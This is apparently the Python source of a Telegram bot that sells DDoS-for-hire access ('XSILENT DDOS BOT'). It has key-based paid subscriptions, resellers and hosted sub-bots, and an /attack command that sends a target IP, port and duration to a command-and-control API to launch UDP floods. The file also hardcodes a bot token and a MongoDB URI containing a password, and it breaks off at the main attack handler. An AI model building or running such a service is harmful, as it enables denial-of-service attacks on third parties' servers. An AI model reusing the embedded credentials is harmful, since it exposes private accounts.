#!/usr/bin/env python3
import telebot
import requests
import time
import threading
import json
import os
import random
import string
import re
import subprocess
import sys
from datetime import datetime, timedelta
from collections import defaultdict
from pymongo import MongoClient

# ========== CONFIG ==========
BOT_TOKEN = "8291785662:AAGR78aQ3bHJLDrxRe7c65XA-NoIhIRWubg"
ADMIN_ID = ["8487946379"]
API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
API_KEY = "PFC10J"
MAX_CONCURRENT = 2
COOLDOWN_TIME = 30
BUY_CONTACT = "XSILENT"

# ========== MAINTENANCE MODE ==========
maintenance_mode = False
maintenance_message = "🔧 Bot is under maintenance! 🔧\n\nPlease try again later."

# ========== HOSTED BOTS ==========
hosted_bots = {}
hosted_bot_instances = {}

# ========== BLOCKED USERS ==========
blocked_users = []

# ========== GLOBAL ATTACK TRACKING ==========
global_active_attacks = {}

# ========== MONGODB CONNECTION ==========
MONGO_URI = "mongodb+srv://mohitrao83076_db_user:LugF1xwlenkWRE1F@monster.ydmmckl.mongodb.net/?retryWrites=true&w=majority&appName=MONSTER"
client = MongoClient(MONGO_URI)
db = client["xsilent_bot"]
users_collection = db["users"]
keys_collection = db["keys"]
groups_collection = db["groups"]
hosted_bots_collection = db["hosted_bots"]
settings_collection = db["settings"]
broadcast_users_collection = db["broadcast_users"]
blocked_users_collection = db["blocked_users"]

# ========== DATA STRUCTURES ==========
active_attacks = {}
cooldown = {}
group_attack_times = {}

# ========== LOAD DATA FROM MONGODB ==========
def load_users():
    users_data = users_collection.find_one({"_id": "users"})
    if not users_data:
        users_collection.insert_one({"_id": "users", "users": [ADMIN_ID[0]], "resellers": []})
        return {"users": [ADMIN_ID[0]], "resellers": []}
    return users_data

def load_blocked_users():
    blocked_data = blocked_users_collection.find_one({"_id": "blocked_users"})
    if not blocked_data:
        blocked_users_collection.insert_one({"_id": "blocked_users", "users": []})
        return {"users": []}
    return blocked_data

def save_blocked_user(user_id):
    blocked_users_collection.update_one(
        {"_id": "blocked_users"},
        {"$addToSet": {"users": user_id}},
        upsert=True
    )

def remove_blocked_user(user_id):
    blocked_users_collection.update_one(
        {"_id": "blocked_users"},
        {"$pull": {"users": user_id}}
    )

def load_broadcast_users():
    broadcast_data = broadcast_users_collection.find_one({"_id": "broadcast_users"})
    if not broadcast_data:
        broadcast_users_collection.insert_one({"_id": "broadcast_users", "users": []})
        return {"users": []}
    return broadcast_data

def save_broadcast_user(user_id):
    broadcast_users_collection.update_one(
        {"_id": "broadcast_users"},
        {"$addToSet": {"users": user_id}},
        upsert=True
    )

def load_settings():
    settings = settings_collection.find_one({"_id": "settings"})
    if not settings:
        settings_collection.insert_one({"_id": "settings", "max_concurrent": 2, "cooldown": 30})
        return {"max_concurrent": 2, "cooldown": 30}
    return settings

def save_settings(settings):
    settings_collection.update_one({"_id": "settings"}, {"$set": settings}, upsert=True)

def load_keys():
    keys = {}
    for key_data in keys_collection.find():
        keys[key_data["key"]] = {
            "user_id": key_data.get("user_id"),
            "duration_value": key_data.get("duration_value"),
            "duration_unit": key_data.get("duration_unit"),
            "generated_by": key_data.get("generated_by"),
            "generated_at": key_data.get("generated_at"),
            "expires_at": key_data.get("expires_at"),
            "used": key_data.get("used", False),
            "used_by": key_data.get("used_by"),
            "used_at": key_data.get("used_at")
        }
    return keys

def save_users(data):
    users_collection.update_one({"_id": "users"}, {"$set": data}, upsert=True)

def save_keys(keys_data):
    keys_collection.delete_many({})
    for key, info in keys_data.items():
        keys_collection.insert_one({
            "key": key,
            "user_id": info.get("user_id"),
            "duration_value": info.get("duration_value"),
            "duration_unit": info.get("duration_unit"),
            "generated_by": info.get("generated_by"),
            "generated_at": info.get("generated_at"),
            "expires_at": info.get("expires_at"),
            "used": info.get("used", False),
            "used_by": info.get("used_by"),
            "used_at": info.get("used_at")
        })

def load_groups():
    groups = {}
    for group_data in groups_collection.find():
        groups[group_data["group_id"]] = {
            "attack_time": group_data.get("attack_time", 60),
            "added_by": group_data.get("added_by"),
            "added_at": group_data.get("added_at")
        }
    return groups

def save_group(group_id, attack_time, added_by):
    groups_collection.update_one(
        {"group_id": group_id},
        {"$set": {
            "attack_time": attack_time,
            "added_by": added_by,
            "added_at": time.time()
        }},
        upsert=True
    )

def remove_group(group_id):
    groups_collection.delete_one({"group_id": group_id})

def get_group_attack_time(group_id):
    group = groups_collection.find_one({"group_id": group_id})
    if group:
        return group.get("attack_time", 60)
    return None

def load_hosted_bots():
    bots = {}
    for bot_data in hosted_bots_collection.find():
        bots[bot_data["bot_token"]] = {
            "owner_id": bot_data.get("owner_id"),
            "owner_name": bot_data.get("owner_name"),
            "concurrent": bot_data.get("concurrent", 1),
            "blocked": bot_data.get("blocked", False),
            "active_attacks": {},
            "users": bot_data.get("users", []),
            "resellers": bot_data.get("resellers", [])
        }
    return bots

def save_hosted_bot(bot_token, owner_id, owner_name, concurrent):
    hosted_bots_collection.update_one(
        {"bot_token": bot_token},
        {"$set": {
            "owner_id": owner_id,
            "owner_name": owner_name,
            "concurrent": concurrent,
            "blocked": False,
            "users": [],
            "resellers": []
        }},
        upsert=True
    )

def remove_hosted_bot(bot_token):
    hosted_bots_collection.delete_one({"bot_token": bot_token})

users_data = load_users()
users = users_data["users"]
resellers = users_data.get("resellers", [])
keys_data = load_keys()
groups = load_groups()
hosted_bots = load_hosted_bots()
settings = load_settings()
broadcast_data = load_broadcast_users()
broadcast_users = broadcast_data.get("users", [])
blocked_data = load_blocked_users()
blocked_users = blocked_data.get("users", [])

MAX_CONCURRENT = settings.get("max_concurrent", 2)
COOLDOWN_TIME = settings.get("cooldown", 30)

bot = telebot.TeleBot(BOT_TOKEN)

# ========== HELPER FUNCTIONS ==========
def check_maintenance():
    return maintenance_mode

def is_user_blocked(user_id):
    return user_id in blocked_users

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    
    if duration_str.isdigit():
        return int(duration_str), "day"
    
    if duration_str.endswith('h'):
        hours = duration_str.replace('h', '')
        if hours.isdigit():
            return int(hours), "hour"
    
    return None, None

def get_expiry_date(value, unit):
    if unit == "hour":
        return datetime.now() + timedelta(hours=value)
    else:
        return datetime.now() + timedelta(days=value)

def format_duration(value, unit):
    if unit == "hour":
        return f"{value} Hour(s)"
    else:
        return f"{value} Day(s)"

def get_global_active_count():
    """Get total active attacks across ALL bots (main + hosted)"""
    now = time.time()
    for attack_id, info in list(global_active_attacks.items()):
        if now >= info["finish_time"]:
            del global_active_attacks[attack_id]
    return len(global_active_attacks)

def add_global_attack(attack_id, user, target_key, finish_time, bot_type, bot_token=None):
    """Add attack to global tracking"""
    global_active_attacks[attack_id] = {
        "user": user,
        "target_key": target_key,
        "finish_time": finish_time,
        "bot_type": bot_type,
        "bot_token": bot_token
    }

def remove_global_attack(attack_id):
    """Remove attack from global tracking"""
    if attack_id in global_active_attacks:
        del global_active_attacks[attack_id]

def check_total_active_attacks():
    now = time.time()
    count = 0
    for attack_id, info in list(active_attacks.items()):
        if now < info["finish_time"]:
            count += 1
        else:
            del active_attacks[attack_id]
    return count

def check_active_attack_by_target(ip, port):
    target_key = f"{ip}:{port}"
    now = time.time()
    for attack_id, attack_info in list(active_attacks.items()):
        if attack_info["target_key"] == target_key:
            if now < attack_info["finish_time"]:
                return attack_info
            else:
                del active_attacks[attack_id]
                return None
    return None

def format_attack_status():
    now = time.time()
    slots = []
    for attack_id, info in active_attacks.items():
        if now < info["finish_time"]:
            remaining = int(info["finish_time"] - now)
            slots.append({
                "target": info["target_key"],
                "user": info["user"],
                "remaining": remaining
            })
    
    slots_status = []
    for i in range(MAX_CONCURRENT):
        if i < len(slots):
            remaining = slots[i]['remaining']
            mins = remaining // 60
            secs = remaining % 60
            time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
            slots_status.append(f"❌ **SLOT {i+1}: BUSY**\n└ 🎯 `{slots[i]['target']}`\n└ 👤 `{slots[i]['user']}`\n└ ⏰ `{time_str}` left")
        else:
            slots_status.append(f"✅ **SLOT {i+1}: FREE**\n└ 💡 Ready for attack")
    
    return slots_status

def remove_user_from_system(user_id):
    if user_id in users:
        users.remove(user_id)
    if user_id in resellers:
        resellers.remove(user_id)
    users_data["users"] = users
    users_data["resellers"] = resellers
    save_users(users_data)
    
    for attack_id in list(active_attacks.keys()):
        if active_attacks[attack_id]["user"] == user_id:
            del active_attacks[attack_id]
    
    if user_id in cooldown:
        del cooldown[user_id]
    
    return True

def check_user_expiry(user_id):
    now = time.time()
    for key, info in keys_data.items():
        if info.get("used_by") == user_id and info.get("used") == True:
            if now < info["expires_at"]:
                return True
    return False

def stop_hosted_bot(bot_token):
    """Stop a hosted bot completely"""
    try:
        if bot_token in hosted_bot_instances:
            try:
                hosted_bot_instances[bot_token].stop_polling()
            except:
                pass
            del hosted_bot_instances[bot_token]
        
        if bot_token in hosted_bots:
            del hosted_bots[bot_token]
        
        remove_hosted_bot(bot_token)
        return True
    except:
        return False

# ========== HOST BOT FUNCTION ==========
def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
    try:
        hosted_bot = telebot.TeleBot(bot_token)
        hosted_bot_instances[bot_token] = hosted_bot
        hosted_cooldown_data = {}
        
        def is_bot_blocked():
            if bot_token in hosted_bots and hosted_bots[bot_token].get("blocked", False):
                return True
            bot_data = hosted_bots_collection.find_one({"bot_token": bot_token})
            if bot_data and bot_data.get("blocked", False):
                if bot_token in hosted_bots:
                    hosted_bots[bot_token]["blocked"] = True
                return True
            return False
        
        def blocked_reply(chat_id):
            try:
                hosted_bot.send_message(chat_id, "🚫 **bot is blocked** 🚫\n\nThis bot has been blocked by the owner.\nContact: XSILENT", parse_mode='Markdown')
            except:
                pass
        
        @hosted_bot.message_handler(func=lambda m: True)
        def check_blocked_all(msg):
            if is_bot_blocked():
                blocked_reply(msg.chat.id)
                return
        
        @hosted_bot.message_handler(commands=['start'])
        def hosted_start(msg):
            if is_bot_blocked():
                blocked_reply(msg.chat.id)
                return
            hosted_bot.reply_to(msg, f"✨ DDOS BOT ✨\n\n👑 Owner: {owner_name}\n✅ Status: Active\n⚡ Concurrent: {concurrent}\n⏱️ Max Time: 300s\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/cooldown\n/addreseller USER_ID\n/removereseller USER_ID\n/addgroup GROUP_ID TIME\n/removegroup GROUP_ID\n/genkey 1 or 5h\n/mykeys\n/redeem KEY\n/help\n\n🛒 Buy: {owner_name}")
        
        @hosted_bot.message_handler(commands=['cooldown'])
        def hosted_cooldown(msg):
            if is_bot_blocked():
                blocked_reply(msg.chat.id)
                return
            uid = str(msg.chat.id)
            if uid in hosted_cooldown_data:
                remaining = hosted_cooldown_data[uid] - time.time()
                if remaining > 0:
                    hosted_bot.reply_to(msg, f"⏳ Cooldown: {int(remaining)}s remaining!")
                else:
                    del hosted_cooldown_data[uid]
                    hosted_bot.reply_to(msg, "✅ No cooldown! You can attack now.")
            else:
                hosted_bot.reply_to(msg, "✅ No cooldown! You can attack now.")
        
        @hosted_bot.message_handler(commands=['addgroup'])
        def hosted_add_group(msg):
            if is_bot_blocked():
                blocked_reply(msg.chat.id)
                return
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner can add groups!")
                return
            args = msg.text.split()
            if len(args) != 3:
                hosted_bot.reply_to(msg, "⚠️ Usage: /addgroup GROUP_ID TIME\n📌 Example: /addgroup -100123456789 60")
                return
            group_id = args[1]
            try:
                attack_time = int(args[2])
                if attack_time < 10 or attack_time > 300:
                    hosted_bot.reply_to(msg, "❌ Attack time must be 10-300 seconds!")
                    return
            except:
                hosted_bot.reply_to(msg, "❌ Invalid time!")
                return
            save_group(group_id, attack_time, uid)
            hosted_bot.reply_to(msg, f"✅ GROUP ADDED!\n👥 Group ID: {group_id}\n⏱️ Attack Time: {attack_time}s")
        
        @hosted_bot.message_handler(commands=['removegroup'])
        def hosted_remove_group(msg):
            if is_bot_blocked():
                blocked_reply(msg.chat.id)
                return
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner can remove groups!")
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /removegroup GROUP_ID")
                return
            group_id = args[1]
            remove_group(group_id)
            hosted_bot.reply_to(msg, f"✅ GROUP REMOVED!\n👥 Group ID: {group_id}")
        
        @hosted_bot.message_handler(commands=['attack'])
        def hosted_attack(msg):
            if is_bot_blocked():
                blocked_reply(msg.chat.id)
                return
            uid = str(msg.chat.id)
            args = msg.text.split()
            if len(args) != 4:
                hosted_bot.reply_to(msg, "⚠️ Usage: /attack IP PORT TIME\n📌 Example: /attack 1.1.1.1 443 60")
                return
            
            # GLOBAL CONCURRENT CHECK
            global_active = get_global_active_count()
            if global_active >= MAX_CONCURRENT:
                hosted_bot.reply_to(msg, f"❌ **GLOBAL LIMIT REACHED!**\n\n🌐 Total active attacks across ALL bots: `{global_active}/{MAX_CONCURRENT}`\n💡 Wait for an attack to finish.\n\n🛒 Buy: XSILENT", parse_mode='Markdown')
                return
            
            ip, port, duration = args[1], args[2], args[3]
            try:
                port = int(port)
                duration = int(duration)
                if duration < 10 or duration > 300:
                    hosted_bot.reply_to(msg, "❌ Duration must be 10-300 seconds!")
                    return
            except:
                hosted_bot.reply_to(msg, "❌ Invalid port or time!")
                return
            
            now = time.time()
            
            if uid in hosted_cooldown_data:
                remaining = hosted_cooldown_data[uid] - now
                if remaining > 0:
                    hosted_bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!")
                    return
            
            attack_id = f"hosted_{bot_token}_{uid}_{int(now)}"
            target_key = f"{ip}:{port}"
            finish_time = now + duration
            
            # Check target under attack
            for aid, ainfo in global_active_attacks.items():
                if ainfo["target_key"] == target_key and now < ainfo["finish_time"]:
                    remaining = int(ainfo["finish_time"] - now)
                    hosted_bot.reply_to(msg, f"❌ TARGET UNDER ATTACK!\n\n🎯 {target_key}\n👤 By: {ainfo['user']}\n⏰ Finishes in: {remaining}s")
                    return
            
            hosted_cooldown_data[uid] = now + COOLDOWN_TIME
            
            # Add to global tracking
            add_global_attack(attack_id, uid, target_key, finish_time, "hosted", bot_token)
            
            new_total = get_global_active_count()
            hosted_bot.reply_to(msg, f"✨ ATTACK LAUNCHED! ✨\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Method: UDP (Auto)\n📊 Global Active: {new_total}/{MAX_CONCURRENT}")
            
            def run():
                try:
                    api_params = {
                        "api_key": API_KEY,
                        "target": ip,
                        "port": port,
                        "time": duration,
                        "concurrent": 1,
                        "method": "udp"
                    }
                    response = requests.get(API_URL, params=api_params, timeout=10)
                    if response.status_code == 200:
                        time.sleep(duration)
                        hosted_bot.send_message(msg.chat.id, f"✅ ATTACK FINISHED!\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔄 Restart your game!")
                    else:
                        hosted_bot.send_message(msg.chat.id, "❌ Attack failed!")
                except:
                    hosted_bot.send_message(msg.chat.id, "❌ Attack error!")
                finally:
                    remove_global_attack(attack_id)
            
            threading.Thread(target=run).start()
        
        @hosted_bot.message_handler(commands=['status'])
        def hosted_status(msg):
            if is_bot_blocked():
                blocked_reply(msg.chat.id)
                return
            global_count = get_global_active_count()
            status_msg = f"🌐 **GLOBAL STATUS**\n📊 Active: `{global_count}/{MAX_CONCURRENT}`\n\n"
            
            active_list = []
            for attack_id, info in global_active_attacks.items():
                if info["finish_time"] > time.time():
                    remaining = int(info["finish_time"] - time.time())
                    active_list.append(f"❌ `{info['target_key']}`\n└ 👤 `{info['user']}`\n└ ⏰ `{remaining}s` left")
            
            if active_list:
                status_msg += "**ACTIVE ATTACKS:**\n" + "\n\n".join(active_list[:MAX_CONCURRENT])
            else:
                status_msg += "✅ **NO ACTIVE ATTACKS**"
            
            hosted_bot.reply_to(msg, status_msg, parse_mode='Markdown')
        
        @hosted_bot.message_handler(commands=['addreseller'])
        def hosted_add_reseller(msg):
            if is_bot_blocked():
                blocked_reply(msg.chat.id)
                return
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner can add resellers!")
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /addreseller USER_ID")
                return
            new_reseller = args[1]
            if bot_token not in hosted_bots:
                hosted_bots[bot_token] = {"resellers": []}
            if "resellers" not in hosted_bots[bot_token]:
                hosted_bots[bot_token]["resellers"] = []
            if new_reseller not in hosted_bots[bot_token]["resellers"]:
                hosted_bots[bot_token]["resellers"].append(new_reseller)
                hosted_bot.reply_to(msg, f"✅ RESELLER ADDED!\n\n👤 User: {new_reseller}\n🔑 Can now generate keys")
            else:
                hosted_bot.reply_to(msg, "❌ User is already a reseller!")
        
        @hosted_bot.message_handler(commands=['removereseller'])
        def hosted_remove_reseller(msg):
            if is_bot_blocked():
                blocked_reply(msg.chat.id)
                return
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner can remove resellers!")
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /removereseller USER_ID")
                return
            target = args[1]
            if bot_token in hosted_bots and "resellers" in hosted_bots[bot_token]:
                if target in hosted_bots[bot_token]["resellers"]:
                    hosted_bots[bot_token]["resellers"].remove(target)
                    hosted_bot.reply_to(msg, f"✅ RESELLER REMOVED!\n\n👤 User: {target}")
                else:
                    hosted_bot.reply_to(msg, "❌ User is not a reseller!")
            else:
                hosted_bot.reply_to(msg, "❌ No resellers found!")
        
        @hosted_bot.message_handler(commands=['genkey'])
        def hosted_genkey(msg):
            if is_bot_blocked():
                blocked_reply(msg.chat.id)
                return
            uid = str(msg.chat.id)
            
            is_reseller = False
            if bot_token in hosted_bots and "resellers" in hosted_bots[bot_token]:
                if uid in hosted_bots[bot_token]["resellers"]:
                    is_reseller = True
            
            if uid != owner_id and not is_reseller:
                hosted_bot.reply_to(msg, "❌ Owner or Reseller only!")
                return
            
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /genkey 1 (1 day) or /genkey 5h (5 hours)")
                return
            
            duration_str = args[1]
            value, unit = parse_duration(duration_str)
            if value is None:
                hosted_bot.reply_to(msg, "❌ Invalid duration!\nUse: 1 (1 day) or 5h (5 hours)")
                return
            
            key = generate_key()
            expires_at = get_expiry_date(value, unit)
            
            keys_data[key] = {
                "user_id": "pending",
                "duration_value": value,
                "duration_unit": unit,
                "generated_by": uid,
                "generated_at": time.time(),
                "expires_at": expires_at.timestamp(),
                "used": False
            }
            save_keys(keys_data)
            
            expiry_str = expires_at.strftime('%Y-%m-%d %H:%M:%S')
            duration_display = format_duration(value, unit)
            
            hosted_bot.reply_to(msg, f"✅ KEY GENERATED!\n\n🔑 Key: `{key}`\n⏰ Duration: {duration_display}\n📅 Expires: {expiry_str}\n\nShare this key with user!\nUser: /redeem {key}")
        
        @hosted_bot.message_handler(commands=['mykeys'])
        def hosted_mykeys(msg):
            if is_bot_blocked():
                blocked_reply(msg.chat.id)
                return
            uid = str(msg.chat.id)
            
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner can view keys!")
                return
            
            my_generated_keys = []
            for key, info in keys_data.items():
                if info.get("generated_by") == uid and not info.get("used", False):
                    expires = datetime.fromtimestamp(info["expires_at"]).strftime('%Y-%m-%d')
                    duration_display = format_duration(info['duration_value'], info['duration_unit'])
                    my_generated_keys.append(f"🔑 {key}\n   ⏰ {duration_display}\n   📅 Expires: {expires}")
            
            if my_generated_keys:
                hosted_bot.reply_to(msg, "📋 YOUR GENERATED KEYS:\n\n" + "\n\n".join(my_generated_keys))
            else:
                hosted_bot.reply_to(msg, "📋 No keys generated yet!")
        
        @hosted_bot.message_handler(commands=['redeem'])
        def hosted_redeem(msg):
            if is_bot_blocked():
                blocked_reply(msg.chat.id)
                return
            uid = str(msg.chat.id)
            
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /redeem KEY")
                return
            
            key = args[1]
            
            if key not in keys_data:
                hosted_bot.reply_to(msg, "❌ Invalid key!")
                return
            
            key_info = keys_data[key]
            
            if key_info.get("used", False):
                hosted_bot.reply_to(msg, "❌ Key already used!")
                return
            
            if time.time() > key_info["expires_at"]:
                hosted_bot.reply_to(msg, "❌ Key expired!")
                del keys_data[key]
                save_keys(keys_data)
                return
            
            if uid not in users:
                users.append(uid)
            
            users_data["users"] = users
            save_users(users_data)
            
            keys_data[key]["used"] = True
            keys_data[key]["used_at"] = time.time()
            keys_data[key]["used_by"] = uid
            save_keys(keys_data)
            
            expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%Y-%m-%d %H:%M:%S')
            duration_display = format_duration(key_info['duration_value'], key_info['duration_unit'])
            
            hosted_bot.reply_to(msg, f"✅ ACCESS GRANTED!\n\n🎉 User {uid} activated!\n⏰ Duration: {duration_display}\n📅 Expires: {expiry_str}\n⚡ Concurrent: {concurrent}")
        
        @hosted_bot.message_handler(commands=['help'])
        def hosted_help(msg):
            if is_bot_blocked():
                blocked_reply(msg.chat.id)
                return
            hosted_bot.reply_to(msg, f"✨ DDOS BOT HELP ✨\n\n👑 Owner: {owner_name}\n\n📝 COMMANDS:\n\n/attack IP PORT TIME - Launch UDP attack\n/status - Check attack slots\n/cooldown - Check your cooldown\n/addreseller USER_ID - Add reseller (Owner only)\n/removereseller USER_ID - Remove reseller (Owner only)\n/addgroup GROUP_ID TIME - Add group (Owner only)\n/removegroup GROUP_ID - Remove group (Owner only)\n/genkey 1 or 5h - Generate key (Owner/Reseller)\n/mykeys - View your keys (Owner only)\n/redeem KEY - Activate key\n/help - This menu\n/start - Bot info\n\n⚡ Concurrent Attacks: {concurrent}\n⏱️ Max Time: 300s\n⏳ Cooldown: {COOLDOWN_TIME}s\n🛒 Buy: {owner_name}")
        
        def run_hosted_bot():
            try:
                hosted_bot.infinity_polling()
            except:
                pass
        
        threading.Thread(target=run_hosted_bot, daemon=True).start()
        return True
    except Exception as e:
        print(f"Failed to start hosted bot: {e}")
        return False

# ========== MAIN BOT COMMANDS ==========
@bot.message_handler(commands=['start'])
def start(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 **You are blocked!** 🚫\n\nYou cannot use this bot.\nContact: XSILENT", parse_mode='Markdown')
        return
    
    save_broadcast_user(uid)
    
    if uid not in users and uid not in ADMIN_ID:
        users.append(uid)
        users_data["users"] = users
        save_users(users_data)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message)
        return
    
    if chat_type == "group" or chat_type == "supergroup":
        group_id = str(msg.chat.id)
        attack_time = get_group_attack_time(group_id)
        if attack_time:
            bot.reply_to(msg, f"✨ XSILENT DDOS BOT - GROUP ✨\n\n✅ Group Approved!\n⚡ Attack Time: {attack_time}s\n\n📝 COMMANDS:\n/attack IP PORT\n/help\n/start")
        else:
            bot.reply_to(msg, f"❌ Group not approved!\n\n🛒 Contact: XSILENT")
        return
    
    if uid in ADMIN_ID:
        bot.reply_to(msg, f"""👑 XSILENT DDOS BOT - OWNER 👑

✅ Full Access
⚡ Global Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
⏱️ Max Time: 300s

📝 COMMANDS:

/attack IP PORT TIME
/status
/cooldown
/setmax 1-100
/setcooldown 1-300

/genkey 1
/genkey 5h
/removekey KEY

/add USER
/remove USER
/addreseller USER
/removereseller USER
/block USER_ID
/unblock USER_ID

/addgroup GROUP_ID TIME
/removegroup GROUP_ID

/host BOT_TOKEN USER_ID CONCURRENT NAME
/unhost BOT_TOKEN
/blockhost BOT_TOKEN
/unblockhost BOT_TOKEN

/maintenance on/off
/broadcast
/stopattack IP:PORT
/allusers
/allblocks
/allgroups
/allhosts
/api_status

🛒 Buy: XSILENT""")
    
    elif uid in resellers:
        bot.reply_to(msg, f"""💎 XSILENT DDOS BOT - RESELLER 💎

✅ Reseller Access
⚡ Global Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s

📝 COMMANDS:

/attack IP PORT TIME
/status
/cooldown
/genkey 1
/genkey 5h
/mykeys

🛒 Buy: XSILENT""")
    
    elif uid in users:
        has_active = check_user_expiry(uid)
        bot.reply_to(msg, f"""🔥 XSILENT DDOS BOT - USER 🔥

✅ Status: {'Active' if has_active else 'Expired'}
⚡ Global Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s

📝 COMMANDS:

/attack IP PORT TIME
/status
/cooldown
/redeem KEY

🛒 Buy: XSILENT""")
    
    else:
        bot.reply_to(msg, f"""❌ Unauthorized!

Use /redeem KEY to activate

🛒 Buy access: XSILENT""")

@bot.message_handler(commands=['block'])
def block_user(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /block USER_ID\n📌 Example: /block 123456789")
        return
    
    target_user = args[1]
    
    if target_user in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot block owner!")
        return
    
    if target_user not in blocked_users:
        blocked_users.append(target_user)
        save_blocked_user(target_user)
        bot.reply_to(msg, f"✅ **USER BLOCKED!**\n\n👤 User: `{target_user}`\n🚫 User can no longer use this bot.", parse_mode='Markdown')
        
        try:
            bot.send_message(target_user, "🚫 **You have been blocked!** 🚫\n\nYou can no longer use this bot.\nContact: XSILENT", parse_mode='Markdown')
        except:
            pass
    else:
        bot.reply_to(msg, f"❌ User `{target_user}` is already blocked!", parse_mode='Markdown')

@bot.message_handler(commands=['unblock'])
def unblock_user(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /unblock USER_ID\n📌 Example: /unblock 123456789")
        return
    
    target_user = args[1]
    
    if target_user in blocked_users:
        blocked_users.remove(target_user)
        remove_blocked_user(target_user)
        bot.reply_to(msg, f"✅ **USER UNBLOCKED!**\n\n👤 User: `{target_user}`\n✅ User can now use this bot again.", parse_mode='Markdown')
        
        try:
            bot.send_message(target_user, "✅ **You have been unblocked!** ✅\n\nYou can now use the bot again.\nUse /start to see commands.", parse_mode='Markdown')
        except:
            pass
    else:
        bot.reply_to(msg, f"❌ User `{target_user}` is not blocked!", parse_mode='Markdown')

@bot.message_handler(commands=['allblocks'])
def all_blocks(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    if blocked_users:
        block_list = "\n".join([f"🚫 `{u}`" for u in blocked_users])
        bot.reply_to(msg, f"📋 **BLOCKED USERS:**\n\n{block_list}\n\n📊 Total: `{len(blocked_users)}`", parse_mode='Markdown')
    else:
        bot.reply_to(msg, "📋 **No blocked users!**", parse_mode='Markdown')

@bot.message_handler(commands=['cooldown'])
def cooldown_cmd(msg):
    uid = str(msg.chat.id)
    
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked!", parse_mode='Markdown')
        return
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message)
        return
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    if uid in cooldown:
        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, f"⏳ Your cooldown: {int(remaining)}s remaining!")
        else:
            del cooldown[uid]
            bot.reply_to(msg, "✅ No cooldown! You can attack now.")
    else:
        bot.reply_to(msg, "✅ No cooldown! You can attack now.")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /setcooldown 1-300\n📌 Example: /setcooldown 60")
        return
    
    try:
        new_cooldown = int(args[1])
        if new_cooldown < 1 or new_cooldown > 300:
            bot.reply_to(msg, "❌ Value must be between 1 and 300 seconds!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid number!")
        return
    
    global COOLDOWN_TIME
    COOLDOWN_TIME = new_cooldown
    settings["cooldown"] = new_cooldown
    save_settings(settings)
    
    bot.reply_to(msg, f"✅ COOLDOWN UPDATED!\n\n⏳ New Cooldown: {COOLDOWN_TIME}s\n💡 Applies to all users and hosted bots")

@bot.message_handler(commands=['setmax'])
def set_max_concurrent(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /setmax 1-100\n📌 Example: /setmax 7")
        return
    
    try:
        new_max = int(args[1])
        if new_max < 1 or new_max > 100:
            bot.reply_to(msg, "❌ Value must be between 1 and 100!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid number!")
        return
    
    global MAX_CONCURRENT
    MAX_CONCURRENT = new_max
    settings["max_concurrent"] = new_max
    save_settings(settings)
    
    bot.reply_to(msg, f"✅ **GLOBAL MAX CONCURRENT UPDATED!**\n\n⚡ **New Value:** `{MAX_CONCURRENT}`\n🌐 Applies to MAIN BOT + ALL HOSTED BOTS\n💡 Total attacks across all bots cannot exceed `{MAX_CONCURRENT}`", parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack(msg):
